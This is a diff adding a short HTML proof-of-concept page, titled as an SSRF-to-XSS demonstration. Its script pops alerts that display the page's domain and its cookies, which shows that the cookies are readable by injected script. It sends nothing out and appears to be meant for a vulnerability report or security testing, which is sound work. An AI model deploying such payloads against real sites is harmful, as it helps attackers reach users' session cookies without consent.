@@ -1,0 +1,11 @@
+<html>
+<head>
+  <title> SSRF to XSS POC</title>
+</head>
+<body>
+<script>
+  alert(document.domain + " is vunerable!");
+  alert(document.cookie + " ---- Here's the captured cookie from the domain!");
+</script>
+</body>
+</html>
